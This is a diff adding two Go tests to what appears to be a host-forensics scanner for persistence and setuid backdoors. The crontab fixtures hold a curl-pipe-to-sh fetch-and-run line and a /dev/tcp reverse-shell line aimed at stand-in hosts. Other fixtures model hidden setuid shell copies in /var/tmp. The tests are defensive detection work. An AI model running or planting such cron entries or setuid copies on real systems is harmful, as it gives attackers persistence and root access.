@@ -293,3 +293,44 @@ func TestPersistCallbackRedactedLineStillHits(t *testing.T) {
 		t.Errorf("Environment line flagged: %v", keys(fs))
 	}
 }
+
+func TestPersistCallbackAcceptDoesNotCoverLaterLines(t *testing.T) {
+	// accept stores key plus Evidence[0].After; a callback added later must
+	// change that text
+	one := persistFile("/etc/crontab", model.PersistKindCron, "0 * * * * root curl -s http://mine.example/a | sh")
+	two := persistFile("/etc/crontab", model.PersistKindCron, "0 * * * * root curl -s http://mine.example/a | sh",
+		"* * * * * root bash -c 'exec 3<>/dev/tcp/evil/4444'")
+	a, b := callbackFindings(t, one), callbackFindings(t, two)
+	if len(a) != 1 || len(b) != 1 || a[0].Key != b[0].Key {
+		t.Fatalf("setup: %v %v", a, b)
+	}
+	if a[0].Evidence[0].After == b[0].Evidence[0].After || !strings.Contains(b[0].Evidence[0].After, "/dev/tcp/evil") || !strings.Contains(b[0].Evidence[0].After, "mine.example") {
+		t.Errorf("after one: %q two: %q", a[0].Evidence[0].After, b[0].Evidence[0].After)
+	}
+}
+
+func TestSetuidPackagedCopy(t *testing.T) {
+	c := cleanCollection()
+	c.Files = append(c.Files,
+		model.FileEntry{Path: "/usr/bin/su", Type: "file", Mode: 0o104755, SHA256: "aa"},
+		model.FileEntry{Path: "/var/tmp/su.bak", Type: "file", Mode: 0o104755, SHA256: "aa"},
+		model.FileEntry{Path: "/var/tmp/su.edited", Type: "file", Mode: 0o104755, SHA256: "bb"},
+		model.FileEntry{Path: "/var/tmp/.s", Type: "file", Mode: 0o104755, SHA256: "cc"}, // bash copy: bash is not setuid
+		model.FileEntry{Path: "/usr/bin/bash", Type: "file", Mode: 0o100755, SHA256: "cc"},
+		model.FileEntry{Path: "/var/tmp/su.nosuid", Type: "file", Mode: 0o102755, SHA256: "aa"}) // setgid copy of a setuid original: different bits
+	owned := cleanOwned()
+	owned["/usr/bin/su"] = "util-linux"
+	owned["/usr/bin/bash"] = "bash"
+	fs := Run(c, ctx, owned)
+	if f := find(fs, "heur.setuid_packaged_copy:/var/tmp/su.bak"); f == nil || f.Severity != model.SevNote {
+		t.Errorf("copy: %v", keys(fs))
+	}
+	if find(fs, "heur.unowned_setuid:/var/tmp/su.bak") != nil {
+		t.Error("copy also reported as unowned")
+	}
+	for _, p := range []string{"/var/tmp/su.edited", "/var/tmp/.s", "/var/tmp/su.nosuid"} {
+		if f := find(fs, "heur.unowned_setuid:"+p); f == nil || f.Severity != model.SevBackdoor {
+			t.Errorf("%s: %v", p, keys(fs))
+		}
+	}
+}
